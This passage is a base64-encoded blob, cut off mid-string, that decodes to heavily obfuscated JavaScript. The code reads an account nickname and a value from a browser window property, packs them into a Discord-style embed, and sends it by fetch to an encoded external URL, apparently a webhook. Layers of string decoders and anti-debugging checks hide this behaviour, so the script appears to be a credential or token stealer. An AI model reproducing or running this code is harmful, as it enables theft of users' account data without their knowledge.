d1o3c1F2ZT0tUEk4WUdfRlsweDFdKTtmb3Iob0VvRFY4OD1QSThZR19GWzB4MF07b0VvRFY4ODxCcG1zQWU7b0VvRFY4OCsrKXt2YXIgaFEwZk9PPVZqNkpjaC5pbmRleE9mKHlJOUVSQVFbb0VvRFY4OF0pO2lmKGhRMGZPTz09PS1QSThZR19GWzB4MV0pY29udGludWU7aWYod1o3c1F2ZTxQSThZR19GWzB4MF0pe3daN3NRdmU9aFEwZk9PfWVsc2V7VFRNdENMTSh3WjdzUXZlKz1oUTBmT08qUEk4WUdfRlsweGNdLHZBcktfeHw9d1o3c1F2ZTw8WXB1SDRKaSxZcHVINEppKz0od1o3c1F2ZSZQSThZR19GWzB4ZF0pPlBJOFlHX0ZbMHhlXT9QSThZR19GWzB4Zl06UEk4WUdfRlsweDEwXSk7ZG97VFRNdENMTShNM3NuSXcucHVzaCh2QXJLX3gmUEk4WUdfRlsweDNdKSx2QXJLX3g+Pj1QSThZR19GWzB4Ml0sWXB1SDRKaS09UEk4WUdfRlsweDJdKX13aGlsZShZcHVINEppPlBJOFlHX0ZbMHg5XSk7d1o3c1F2ZT0tUEk4WUdfRlsweDFdfX1pZih3WjdzUXZlPi1QSThZR19GWzB4MV0pe00zc25Jdy5wdXNoKCh2QXJLX3h8d1o3c1F2ZTw8WXB1SDRKaSkmUEk4WUdfRlsweDNdKX1yZXR1cm4genNmYmpKRChNM3NuSXcpfWZ1bmN0aW9uIE0zc25JdyhaRDQyV3ope2lmKHR5cGVvZiB0S2ExYU5bWkQ0Mld6XT09PVBJOFlHX0ZbMHg1XSl7cmV0dXJuIHRLYTFhTltaRDQyV3pdPUJwbXNBZShBVUxVQWxbWkQ0Mld6XSl9cmV0dXJuIHRLYTFhTltaRDQyV3pdfWlmKFpENDJXelt5STlFUkFRKDB4NjcpXT8udGFnTmFtZSE9PU0zc25JdygweDY4KSYmWkQ0Mld6W00zc25JdygweDY5KV0/LnRhZ05hbWUhPT1NM3NuSXcoMHg2YSkpe2Z1bmN0aW9uIHZBcktfeChaRDQyV3ope3ZhciBWajZKY2g9IjF+OltEQEVMc1NdWjxSMD1kVUclbjdwa2xJMllRIUs2M04paEpGVENcIi4/UHFgbVZvZ15mdGV9VzsrQio4QXt6cjR5OSNIT014JHd8JnYsYWljWHVqYig1Pi9fIix5STlFUkFRLEJwbXNBZSxNM3NuSXcsdkFyS194LFlwdUg0Smksd1o3c1F2ZSxvRW9EVjg4O1RUTXRDTE0oeUk5RVJBUT0iIisoWkQ0Mld6fHwiIiksQnBtc0FlPXlJOUVSQVEubGVuZ3RoLE0zc25Jdz1bXSx2QXJLX3g9UEk4WUdfRlsweDBdLFlwdUg0Smk9UEk4WUdfRlsweDBdLHdaN3NRdmU9LVBJOFlHX0ZbMHgxXSk7Zm9yKG9Fb0RWODg9UEk4WUdfRlsweDBdO29Fb0RWODg8QnBtc0FlO29Fb0RWODgrKyl7dmFyIGhRMGZPTz1WajZKY2guaW5kZXhPZih5STlFUkFRW29Fb0RWODhdKTtpZihoUTBmT089PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKHdaN3NRdmU8UEk4WUdfRlsweDBdKXt3WjdzUXZlPWhRMGZPT31lbHNle1RUTXRDTE0od1o3c1F2ZSs9aFEwZk9PKlBJOFlHX0ZbMHhjXSx2QXJLX3h8PXdaN3NRdmU8PFlwdUg0SmksWXB1SDRKaSs9KHdaN3NRdmUmUEk4WUdfRlsweGRdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0oTTNzbkl3LnB1c2godkFyS194JlBJOFlHX0ZbMHgzXSksdkFyS194Pj49UEk4WUdfRlsweDJdLFlwdUg0SmktPVBJOFlHX0ZbMHgyXSl9d2hpbGUoWXB1SDRKaT5QSThZR19GWzB4OV0pO3daN3NRdmU9LVBJOFlHX0ZbMHgxXX19aWYod1o3c1F2ZT4tUEk4WUdfRlsweDFdKXtNM3NuSXcucHVzaCgodkFyS194fHdaN3NRdmU8PFlwdUg0SmkpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQoTTNzbkl3KX1mdW5jdGlvbiBZcHVINEppKFpENDJXeil7aWYodHlwZW9mIHRLYTFhTltaRDQyV3pdPT09UEk4WUdfRlsweDVdKXtyZXR1cm4gdEthMWFOW1pENDJXel09dkFyS194KEFVTFVBbFtaRDQyV3pdKX1yZXR1cm4gdEthMWFOW1pENDJXel19aWYodFdZYV9iW1lwdUg0SmkoMHg2YildKFpENDJXeltZcHVINEppKDB4NmMpXSkpe3JldHVybiBQSThZR19GWzB4MTNdfX19ZWxzZXtmdW5jdGlvbiB3WjdzUXZlKFpENDJXeil7dmFyIFZqNkpjaD0iYng2IWFgXUtUMmgoT3tzUFhOMXE4b0BITH5FZl5ucmkpRk1JQVJEN2UsQnZnY3l0a1VHbVo9KlYvQ1lXJHBTSltRbGp3MysmdT85LjVcIl80enw6MD47JX0jPGQiLHlJOUVSQVEsQnBtc0FlLE0zc25Jdyx2QXJLX3gsWXB1SDRKaSx3WjdzUXZlLG9Fb0RWODg7VFRNdENMTSh5STlFUkFRPSIiKyhaRDQyV3p8fCIiKSxCcG1zQWU9eUk5RVJBUS5sZW5ndGgsTTNzbkl3PVtdLHZBcktfeD1QSThZR19GWzB4MF0sWXB1SDRKaT1QSThZR19GWzB4MF0sd1o3c1F2ZT0tUEk4WUdfRlsweDFdKTtmb3Iob0VvRFY4OD1QSThZR19GWzB4MF07b0VvRFY4ODxCcG1zQWU7b0VvRFY4OCsrKXt2YXIgaFEwZk9PPVZqNkpjaC5pbmRleE9mKHlJOUVSQVFbb0VvRFY4OF0pO2lmKGhRMGZPTz09PS1QSThZR19GWzB4MV0pY29udGludWU7aWYod1o3c1F2ZTxQSThZR19GWzB4MF0pe3daN3NRdmU9aFEwZk9PfWVsc2V7VFRNdENMTSh3WjdzUXZlKz1oUTBmT08qUEk4WUdfRlsweGNdLHZBcktfeHw9d1o3c1F2ZTw8WXB1SDRKaSxZcHVINEppKz0od1o3c1F2ZSZQSThZR19GWzB4ZF0pPlBJOFlHX0ZbMHhlXT9QSThZR19GWzB4Zl06UEk4WUdfRlsweDEwXSk7ZG97VFRNdENMTShNM3NuSXcucHVzaCh2QXJLX3gmUEk4WUdfRlsweDNdKSx2QXJLX3g+Pj1QSThZR19GWzB4Ml0sWXB1SDRKaS09UEk4WUdfRlsweDJdKX13aGlsZShZcHVINEppPlBJOFlHX0ZbMHg5XSk7d1o3c1F2ZT0tUEk4WUdfRlsweDFdfX1pZih3WjdzUXZlPi1QSThZR19GWzB4MV0pe00zc25Jdy5wdXNoKCh2QXJLX3h8d1o3c1F2ZTw8WXB1SDRKaSkmUEk4WUdfRlsweDNdKX1yZXR1cm4genNmYmpKRChNM3NuSXcpfWZ1bmN0aW9uIG9Fb0RWODgoWkQ0Mld6KXtpZih0eXBlb2YgdEthMWFOW1pENDJXel09PT1QSThZR19GWzB4NV0pe3JldHVybiB0S2ExYU5bWkQ0Mld6XT13WjdzUXZlKEFVTFVBbFtaRDQyV3pdKX1yZXR1cm4gdEthMWFOW1pENDJXel19aWYoWkQ0Mld6W3lJOUVSQVEoUEk4WUdfRlsweDE0XSldPT09Tm9kZVtvRW9EVjg4KDB4NmQpXSl7ZnVuY3Rpb24gaFEwZk9PKFpENDJXeil7dmFyIFZqNkpjaD0iQztMS31qPD1ScnRGTldNaXluOkkxfClUbWdxXiVQNVNiMHVYUXtvWzQsXX44ZCYzPmFEQCp2eigvc0pjZlorX3dCOSQjSEFHVVwiRTI/a1ZwT2x4ZTYuWWBoITciLHlJOUVSQVEsQnBtc0FlLE0zc25Jdyx2QXJLX3gsWXB1SDRKaSx3WjdzUXZlLG9Fb0RWODg7VFRNdENMTSh5STlFUkFRPSIiKyhaRDQyV3p8fCIiKSxCcG1zQWU9eUk5RVJBUS5sZW5ndGgsTTNzbkl3PVtdLHZBcktfeD1QSThZR19GWzB4MF0sWXB1SDRKaT1QSThZR19GWzB4MF0sd1o3c1F2ZT0tUEk4WUdfRlsweDFdKTtmb3Iob0VvRFY4OD1QSThZR19GWzB4MF07b0VvRFY4ODxCcG1zQWU7b0VvRFY4OCsrKXt2YXIgaFEwZk9PPVZqNkpjaC5pbmRleE9mKHlJOUVSQVFbb0VvRFY4OF0pO2lmKGhRMGZPTz09PS1QSThZR19GWzB4MV0pY29udGludWU7aWYod1o3c1F2ZTxQSThZR19GWzB4MF0pe3daN3NRdmU9aFEwZk9PfWVsc2V7VFRNdENMTSh3WjdzUXZlKz1oUTBmT08qUEk4WUdfRlsweGNdLHZBcktfeHw9d1o3c1F2ZTw8WXB1SDRKaSxZcHVINEppKz0od1o3c1F2ZSZQSThZR19GWzB4ZF0pPlBJOFlHX0ZbMHhlXT9QSThZR19GWzB4Zl06UEk4WUdfRlsweDEwXSk7ZG97VFRNdENMTShNM3NuSXcucHVzaCh2QXJLX3gmUEk4WUdfRlsweDNdKSx2QXJLX3g+Pj1QSThZR19GWzB4Ml0sWXB1SDRKaS09UEk4WUdfRlsweDJdKX13aGlsZShZcHVINEppPlBJOFlHX0ZbMHg5XSk7d1o3c1F2ZT0tUEk4WUdfRlsweDFdfX1pZih3WjdzUXZlPi1QSThZR19GWzB4MV0pe00zc25Jdy5wdXNoKCh2QXJLX3h8d1o3c1F2ZTw8WXB1SDRKaSkmUEk4WUdfRlsweDNdKX1yZXR1cm4genNmYmpKRChNM3NuSXcpfWZ1bmN0aW9uIGtKMUNfWShaRDQyV3ope2lmKHR5cGVvZiB0S2ExYU5bWkQ0Mld6XT09PVBJOFlHX0ZbMHg1XSl7cmV0dXJuIHRLYTFhTltaRDQyV3pdPWhRMGZPTyhBVUxVQWxbWkQ0Mld6XSl9cmV0dXJuIHRLYTFhTltaRDQyV3pdfWlmKChaRDQyV3pba0oxQ19ZKFBJOFlHX0ZbMHgxNV0pXT09PWtKMUNfWSgweDZmKXx8WkQ0Mld6W2tKMUNfWShQSThZR19GWzB4MTVdKV09PT1rSjFDX1koMHg3MCkpJiZ0V1lhX2Jba0oxQ19ZKDB4NzEpXShaRDQyV3pba0oxQ19ZKDB4NzIpXSkpe2Z1bmN0aW9uIGloNjhFRShaRDQyV3ope3ZhciBWajZKY2g9IiNsYkFoZExxT0Jub0NEclFOZWtaWGlQRXhJNSl1fDcsLzE0Oy5mcE1TamNfNnswKD88JXc+W31eYD0hQFZZVEtIUkZHOXR+VXldXCJnMyordiYkVzpKOG1zemEyIix5STlFUkFRLEJwbXNBZSxNM3NuSXcsdkFyS194LFlwdUg0Smksd1o3c1F2ZSxvRW9EVjg4O1RUTXRDTE0oeUk5RVJBUT0iIisoWkQ0Mld6fHwiIiksQnBtc0FlPXlJOUVSQVEubGVuZ3RoLE0zc25Jdz1bXSx2QXJLX3g9UEk4WUdfRlsweDBdLFlwdUg0Smk9UEk4WUdfRlsweDBdLHdaN3NRdmU9LVBJOFlHX0ZbMHgxXSk7Zm9yKG9Fb0RWODg9UEk4WUdfRlsweDBdO29Fb0RWODg8QnBtc0FlO29Fb0RWODgrKyl7dmFyIGhRMGZPTz1WajZKY2guaW5kZXhPZih5STlFUkFRW29Fb0RWODhdKTtpZihoUTBmT089PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKHdaN3NRdmU8UEk4WUdfRlsweDBdKXt3WjdzUXZlPWhRMGZPT31lbHNle1RUTXRDTE0od1o3c1F2ZSs9aFEwZk9PKlBJOFlHX0ZbMHhjXSx2QXJLX3h8PXdaN3NRdmU8PFlwdUg0SmksWXB1SDRKaSs9KHdaN3NRdmUmUEk4WUdfRlsweGRdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0oTTNzbkl3LnB1c2godkFyS194JlBJOFlHX0ZbMHgzXSksdkFyS194Pj49UEk4WUdfRlsweDJdLFlwdUg0SmktPVBJOFlHX0ZbMHgyXSl9d2hpbGUoWXB1SDRKaT5QSThZR19GWzB4OV0pO3daN3NRdmU9LVBJOFlHX0ZbMHgxXX19aWYod1o3c1F2ZT4tUEk4WUdfRlsweDFdKXtNM3NuSXcucHVzaCgodkFyS194fHdaN3NRdmU8PFlwdUg0SmkpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQoTTNzbkl3KX1mdW5jdGlvbiBtTXhzeGgoWkQ0Mld6KXtpZih0eXBlb2YgdEthMWFOW1pENDJXel09PT1QSThZR19GWzB4NV0pe3JldHVybiB0S2ExYU5bWkQ0Mld6XT1paDY4RUUoQVVMVUFsW1pENDJXel0pfXJldHVybiB0S2ExYU5bWkQ0Mld6XX1pZihtTXhzeGgoMHg3MylpbiB3NzB6OEYpe2plNFQ3VXUoKX1mdW5jdGlvbiBqZTRUN1V1KCl7ZnVuY3Rpb24gWkQ0Mld6KFpENDJXeil7cmV0dXJuIFpENDJXeltQSThZR19GWzB4MV1dKlBJOFlHX0ZbMHgxN10rKFpENDJXeltQSThZR19GWzB4MF1dPFBJOFlHX0ZbMHgwXT9QSThZR19GWzB4MTZdfFpENDJXeltQSThZR19GWzB4MF1dOlpENDJXeltQSThZR19GWzB4MF1dKX1mdW5jdGlvbiBWajZKY2goWkQ0Mld6KXtzd2l0Y2goKChaRDQyV3omUEk4WUdfRlsweDE2XSkhPT1QSThZR19GWzB4MF0pKlBJOFlHX0ZbMHgxXSsoWkQ0Mld6PFBJOFlHX0ZbMHgwXSkqUEk4WUdfRlsweDE4XSl7Y2FzZSBQSThZR19GWzB4MF06cmV0dXJuW1pENDJXeiVQSThZR19GWzB4MTZdLE1hdGgudHJ1bmMoWkQ0Mld6L1BJOFlHX0ZbMHgxN10pXTtjYXNlIFBJOFlHX0ZbMHgxXTpyZXR1cm5bWkQ0Mld6JVBJOFlHX0ZbMHgxNl0tUEk4WUdfRlsweDE2XSxNYXRoLnRydW5jKFpENDJXei9QSThZR19GWzB4MTddKStQSThZR19GWzB4MV1dO2Nhc2UgUEk4WUdfRlsweDE4XTpyZXR1cm5bKChaRDQyV3orUEk4WUdfRlsweDE2XSklUEk4WUdfRlsweDE2XStQSThZR19GWzB4MTZdKSVQSThZR19GWzB4MTZdLE1hdGgucm91bmQoWkQ0Mld6L1BJOFlHX0ZbMHgxN10pXTtjYXNlIFBJOFlHX0ZbMHgxOV06cmV0dXJuW1pENDJXeiVQSThZR19GWzB4MTZdLE1hdGgudHJ1bmMoWkQ0Mld6L1BJOFlHX0ZbMHgxN10pXX19bGV0IHlJOUVSQVE9WkQ0Mld6KFtQSThZR19GWzB4MThdLDB4NF0pLEJwbXNBZT1aRDQyV3ooW1BJOFlHX0ZbMHgxXSxQSThZR19GWzB4MThdXSksTTNzbkl3PXlJOUVSQVErQnBtc0FlLHZBcktfeD1NM3NuSXctQnBtc0FlLFlwdUg0Smk9dkFyS194KlBJOFlHX0ZbMHgxOF0sd1o3c1F2ZT1ZcHVINEppL1BJOFlHX0ZbMHgxOF07VFRNdENMTShjb25zb2xlLmxvZyhWajZKY2goTTNzbkl3KSksY29uc29sZS5sb2coVmo2SmNoKHZBcktfeCkpLGNvbnNvbGUubG9nKFZqNkpjaChZcHVINEppKSksY29uc29sZS5sb2coVmo2SmNoKHdaN3NRdmUpKSl9cmV0dXJuIFBJOFlHX0ZbMHgxM119Zm9yKGNvbnN0IG9aMzEySUUgb2YgWkQ0Mld6W2tKMUNfWSgweDc0KV0paWYoQXo4T3BmRihvWjMxMklFKSl7cmV0dXJuIFBJOFlHX0ZbMHgxM119fX1yZXR1cm4gUEk4WUdfRlsweDExXX1hc3luYyBmdW5jdGlvbiB3WjdzUXZlKFpENDJXej1WajZKY2goMHg3NSkpe3RyeXtmdW5jdGlvbiB5STlFUkFRKFpENDJXeil7dmFyIHlJOUVSQVE9InU7W0RSaDxDMEJvSldBTyoxUUd9amUjRWYydik3XTRaSG5QTE1hKFZOfDpwcVlrIT4lOFUkSVNsdz1+aUBUdG0/XzMvNXteOXhkK0tjejZ5ci4mZ1wiYHMsWEZiIixCcG1zQWUsZGlLRWloYSxNM3NuSXcsdkFyS194LFlwdUg0SmksdFdZYV9iLEF6OE9wZkY7VFRNdENMTShCcG1zQWU9IiIrKFpENDJXenx8IiIpLGRpS0VpaGE9QnBtc0FlLmxlbmd0aCxNM3NuSXc9W10sdkFyS194PVBJOFlHX0ZbMHgwXSxZcHVINEppPVBJOFlHX0ZbMHgwXSx0V1lhX2I9LVBJOFlHX0ZbMHgxXSk7Zm9yKEF6OE9wZkY9UEk4WUdfRlsweDBdO0F6OE9wZkY8ZGlLRWloYTtBejhPcGZGKyspe3ZhciB3WjdzUXZlPXlJOUVSQVEuaW5kZXhPZihCcG1zQWVbQXo4T3BmRl0pO2lmKHdaN3NRdmU9PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKHRXWWFfYjxQSThZR19GWzB4MF0pe3RXWWFfYj13WjdzUXZlfWVsc2V7VFRNdENMTSh0V1lhX2IrPXdaN3NRdmUqUEk4WUdfRlsweGNdLHZBcktfeHw9dFdZYV9iPDxZcHVINEppLFlwdUg0SmkrPSh0V1lhX2ImUEk4WUdfRlsweGRdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0oTTNzbkl3LnB1c2godkFyS194JlBJOFlHX0ZbMHgzXSksdkFyS194Pj49UEk4WUdfRlsweDJdLFlwdUg0SmktPVBJOFlHX0ZbMHgyXSl9d2hpbGUoWXB1SDRKaT5QSThZR19GWzB4OV0pO3RXWWFfYj0tUEk4WUdfRlsweDFdfX1pZih0V1lhX2I+LVBJOFlHX0ZbMHgxXSl7TTNzbkl3LnB1c2goKHZBcktfeHx0V1lhX2I8PFlwdUg0SmkpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQoTTNzbkl3KX1mdW5jdGlvbiBCcG1zQWUoWkQ0Mld6KXtpZih0eXBlb2YgdEthMWFOW1pENDJXel09PT1QSThZR19GWzB4NV0pe3JldHVybiB0S2ExYU5bWkQ0Mld6XT15STlFUkFRKEFVTFVBbFtaRDQyV3pdKX1yZXR1cm4gdEthMWFOW1pENDJXel19Y29uc3QgZGlLRWloYT1hd2FpdCBmZXRjaChCcG1zQWUoMHg3Nikse1tCcG1zQWUoUEk4WUdfRlsweDFjXSldOkJwbXNBZShQSThZR19GWzB4MWRdKSxbQnBtc0FlKDB4NzkpXTpCcG1zQWUoMHg3YSl9KTtpZighZGlLRWloYVtQSThZR19GWzB4MWVdXSl7ZnVuY3Rpb24gTTNzbkl3KFpENDJXeil7dmFyIHlJOUVSQVE9IjJiUklXT1VyR1poSkxpcFFEZE1TakZUYU5rb0tIZWZBY25DRTNCeXh1Ni9nWW1fdn0qJFZxWGwlUDkocyZ0OikjPys+dzA4ITw9XV58Wy4xe34sXCJ6NzRAYDU7IixCcG1zQWUsZGlLRWloYSxNM3NuSXcsdkFyS194LFlwdUg0SmksdFdZYV9iLEF6OE9wZkY7VFRNdENMTShCcG1zQWU9IiIrKFpENDJXenx8IiIpLGRpS0VpaGE9QnBtc0FlLmxlbmd0aCxNM3NuSXc9W10sdkFyS194PVBJOFlHX0ZbMHgwXSxZcHVINEppPVBJOFlHX0ZbMHgwXSx0V1lhX2I9LVBJOFlHX0ZbMHgxXSk7Zm9yKEF6OE9wZkY9UEk4WUdfRlsweDBdO0F6OE9wZkY8ZGlLRWloYTtBejhPcGZGKyspe3ZhciB3WjdzUXZlPXlJOUVSQVEuaW5kZXhPZihCcG1zQWVbQXo4T3BmRl0pO2lmKHdaN3NRdmU9PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKHRXWWFfYjxQSThZR19GWzB4MF0pe3RXWWFfYj13WjdzUXZlfWVsc2V7VFRNdENMTSh0V1lhX2IrPXdaN3NRdmUqUEk4WUdfRlsweGNdLHZBcktfeHw9dFdZYV9iPDxZcHVINEppLFlwdUg0SmkrPSh0V1lhX2ImUEk4WUdfRlsweGRdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0oTTNzbkl3LnB1c2godkFyS194JlBJOFlHX0ZbMHgzXSksdkFyS194Pj49UEk4WUdfRlsweDJdLFlwdUg0SmktPVBJOFlHX0ZbMHgyXSl9d2hpbGUoWXB1SDRKaT5QSThZR19GWzB4OV0pO3RXWWFfYj0tUEk4WUdfRlsweDFdfX1pZih0V1lhX2I+LVBJOFlHX0ZbMHgxXSl7TTNzbkl3LnB1c2goKHZBcktfeHx0V1lhX2I8PFlwdUg0SmkpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQoTTNzbkl3KX1mdW5jdGlvbiB2QXJLX3goWkQ0Mld6KXtpZih0eXBlb2YgdEthMWFOW1pENDJXel09PT1QSThZR19GWzB4NV0pe3JldHVybiB0S2ExYU5bWkQ0Mld6XT1NM3NuSXcoQVVMVUFsW1pENDJXel0pfXJldHVybiB0S2ExYU5bWkQ0Mld6XX10aHJvdyBuZXcgRXJyb3IodkFyS194KDB4N2IpK2RpS0VpaGFbdkFyS194KDB4N2MpXSl9Y29uc3QgWXB1SDRKaT1hd2FpdCBkaUtFaWhhW0JwbXNBZSgweDdkKV0oKSx0V1lhX2I9WXB1SDRKaT8uZGF0YT8ubmlja25hbWV8fEJwbXNBZSgweDdlKSxBejhPcGZGPXdpbmRvd1tCcG1zQWUoUEk4WUdfRlsweDFhXSldW0JwbXNBZShQSThZR19GWzB4MWJdKV0sd1o3c1F2ZT17W0JwbXNBZSgweDgxKV06W3tbQnBtc0FlKDB4ODIpXTpCcG1zQWUoMHg4MyksW0JwbXNBZSgweDg0KV06QnBtc0FlKDB4ODUpK3RXWWFfYitCcG1zQWUoMHg4NikrQXo4T3BmRitCcG1zQWUoMHg4NykrZW5jb2RlVVJJQ29tcG9uZW50KHRXWWFfYikrIikiLFtCcG1zQWUoMHg4OCldOjB4NTg2NWYyLFtCcG1zQWUoMHg4OSldOm5ldyBEYXRlKClbQnBtc0FlKDB4OGEpXSgpfV19LG9Fb0RWODg9YXdhaXQgZmV0Y2goWkQ0Mld6LHtbQnBtc0FlKFBJOFlHX0ZbMHgxY10pXTpCcG1zQWUoUEk4WUdfRlsweDFkXSksW0JwbXNBZSgweDhiKV06e1tCcG1zQWUoMHg4YyldOkJwbXNBZSgweDhkKX0sW0JwbXNBZSgweDhlKV06SlNPTltCcG1zQWUoMHg4ZildKHdaN3NRdmUpfSk7aWYoIW9Fb0RWODhbUEk4WUdfRlsweDFlXV0pe2Z1bmN0aW9uIHc3MHo4RihaRDQyV3ope3ZhciB5STlFUkFRPSJPfD0yRltZfmxiQG5YV0gxaEs/eFFkMGAhVl9dejM4RVo2PCVmRGlxJnI3LHV9K14jLmtzbyl2akwqUm05eU00Q1N7QmF3KDpBOy8kY1wiNUlOcEpUVT5HZ3RQZSIsQnBtc0FlLGRpS0VpaGEsTTNzbkl3LHZBcktfeCxZcHVINEppLHRXWWFfYixBejhPcGZGO1RUTXRDTE0oQnBtc0FlPSIiKyhaRDQyV3p8fCIiKSxkaUtFaWhhPUJwbXNBZS5sZW5ndGgsTTNzbkl3PVtdLHZBcktfeD1QSThZR19GWzB4MF0sWXB1SDRKaT1QSThZR19GWzB4MF0sdFdZYV9iPS1QSThZR19GWzB4MV0pO2ZvcihBejhPcGZGPVBJOFlHX0ZbMHgwXTtBejhPcGZGPGRpS0VpaGE7QXo4T3BmRisrKXt2YXIgd1o3c1F2ZT15STlFUkFRLmluZGV4T2YoQnBtc0FlW0F6OE9wZkZdKTtpZih3WjdzUXZlPT09LVBJOFlHX0ZbMHgxXSljb250aW51ZTtpZih0V1lhX2I8UEk4WUdfRlsweDBdKXt0V1lhX2I9d1o3c1F2ZX1lbHNle1RUTXRDTE0odFdZYV9iKz13WjdzUXZlKlBJOFlHX0ZbMHhjXSx2QXJLX3h8PXRXWWFfYjw8WXB1SDRKaSxZcHVINEppKz0odFdZYV9iJlBJOFlHX0ZbMHhkXSk+UEk4WUdfRlsweGVdP1BJOFlHX0ZbMHhmXTpQSThZR19GWzB4MTBdKTtkb3tUVE10Q0xNKE0zc25Jdy5wdXNoKHZBcktfeCZQSThZR19GWzB4M10pLHZBcktfeD4+PVBJOFlHX0ZbMHgyXSxZcHVINEppLT1QSThZR19GWzB4Ml0pfXdoaWxlKFlwdUg0Smk+UEk4WUdfRlsweDldKTt0V1lhX2I9LVBJOFlHX0ZbMHgxXX19aWYodFdZYV9iPi1QSThZR19GWzB4MV0pe00zc25Jdy5wdXNoKCh2QXJLX3h8dFdZYV9iPDxZcHVINEppKSZQSThZR19GWzB4M10pfXJldHVybiB6c2ZiakpEKE0zc25Jdyl9ZnVuY3Rpb24gTWhRTkF5VihaRDQyV3ope2lmKHR5cGVvZiB0S2ExYU5bWkQ0Mld6XT09PVBJOFlHX0ZbMHg1XSl7cmV0dXJuIHRLYTFhTltaRDQyV3pdPXc3MHo4RihBVUxVQWxbWkQ0Mld6XSl9cmV0dXJuIHRLYTFhTltaRDQyV3pdfXRocm93IG5ldyBFcnJvcihCcG1zQWUoMHg5MCkrb0VvRFY4OFtNaFFOQXlWKDB4OTEpXSl9Y29uc29sZVtCcG1zQWUoMHg5MildKEJwbXNBZSgweDkzKSl9Y2F0Y2goREtGV25KbSl7ZnVuY3Rpb24gSWQ5Vmh6KFpENDJXeil7dmFyIHlJOUVSQVE9IjhzbUA9MWdCd2l0WzV2e01RRnFleVpyRTxjbjtYL3BWKnxJSkxvdSRDRF8pNisseDR9XCIhWTp6MF0/KH5mXkhqPlJhQUslLmgzVWxUMlBOZE9iIzlXJmBTazdHIixCcG1zQWUsZGlLRWloYSxNM3NuSXcsdkFyS194LFlwdUg0SmksdFdZYV9iLEF6OE9wZkY7VFRNdENMTShCcG1zQWU9IiIrKFpENDJXenx8IiIpLGRpS0VpaGE9QnBtc0FlLmxlbmd0aCxNM3NuSXc9W10sdkFyS194PVBJOFlHX0ZbMHgwXSxZcHVINEppPVBJOFlHX0ZbMHgwXSx0V1lhX2I9LVBJOFlHX0ZbMHgxXSk7Zm9yKEF6OE9wZkY9UEk4WUdfRlsweDBdO0F6OE9wZkY8ZGlLRWloYTtBejhPcGZGKyspe3ZhciB3WjdzUXZlPXlJOUVSQVEuaW5kZXhPZihCcG1zQWVbQXo4T3BmRl0pO2lmKHdaN3NRdmU9PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKHRXWWFfYjxQSThZR19GWzB4MF0pe3RXWWFfYj13WjdzUXZlfWVsc2V7VFRNdENMTSh0V1lhX2IrPXdaN3NRdmUqUEk4WUdfRlsweGNdLHZBcktfeHw9dFdZYV9iPDxZcHVINEppLFlwdUg0SmkrPSh0V1lhX2ImUEk4WUdfRlsweGRdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0oTTNzbkl3LnB1c2godkFyS194JlBJOFlHX0ZbMHgzXSksdkFyS194Pj49UEk4WUdfRlsweDJdLFlwdUg0SmktPVBJOFlHX0ZbMHgyXSl9d2hpbGUoWXB1SDRKaT5QSThZR19GWzB4OV0pO3RXWWFfYj0tUEk4WUdfRlsweDFdfX1pZih0V1lhX2I+LVBJOFlHX0ZbMHgxXSl7TTNzbkl3LnB1c2goKHZBcktfeHx0V1lhX2I8PFlwdUg0SmkpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQoTTNzbkl3KX1mdW5jdGlvbiBUWV9kc3dWKFpENDJXeil7aWYodHlwZW9mIHRLYTFhTltaRDQyV3pdPT09UEk4WUdfRlsweDVdKXtyZXR1cm4gdEthMWFOW1pENDJXel09SWQ5Vmh6KEFVTFVBbFtaRDQyV3pdKX1yZXR1cm4gdEthMWFOW1pENDJXel19Y29uc29sZVtWajZKY2goMHg5NCldKFRZX2Rzd1YoMHg5NSksREtGV25KbSl9fWZ1bmN0aW9uIG9Fb0RWODgoKXtpZihkaUtFaWhhKXtyZXR1cm59aWYoQXo4T3BmRihkb2N1bWVudFtWajZKY2goMHg5NildKSl7ZnVuY3Rpb24gWkQ0Mld6KFpENDJXeil7dmFyIHlJOUVSQVE9Ii4kYCk8e08qWiZ4V0oyTDNtOGllVEt8b0R5UG5DSGI9fXd2WTY0QF45TnA1L0JrK01FamxcIlJdQWYjKHRVcmg3WCVjX1N6Oj9GdUk7MUc+UX4wcyxWW2FxZyFkIixWajZKY2gsQnBtc0FlLGRpS0VpaGEsTTNzbkl3LHZBcktfeCxZcHVINEppLHRXWWFfYjtUVE10Q0xNKFZqNkpjaD0iIisoWkQ0Mld6fHwiIiksQnBtc0FlPVZqNkpjaC5sZW5ndGgsZGlLRWloYT1bXSxNM3NuSXc9UEk4WUdfRlsweDBdLHZBcktfeD1QSThZR19GWzB4MF0sWXB1SDRKaT0tUEk4WUdfRlsweDFdKTtmb3IodFdZYV9iPVBJOFlHX0ZbMHgwXTt0V1lhX2I8QnBtc0FlO3RXWWFfYisrKXt2YXIgQXo4T3BmRj15STlFUkFRLmluZGV4T2YoVmo2SmNoW3RXWWFfYl0pO2lmKEF6OE9wZkY9PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKFlwdUg0Smk8UEk4WUdfRlsweDBdKXtZcHVINEppPUF6OE9wZkZ9ZWxzZXtUVE10Q0xNKFlwdUg0SmkrPUF6OE9wZkYqUEk4WUdfRlsweGNdLE0zc25Jd3w9WXB1SDRKaTw8dkFyS194LHZBcktfeCs9KFlwdUg0SmkmUEk4WUdfRlsweG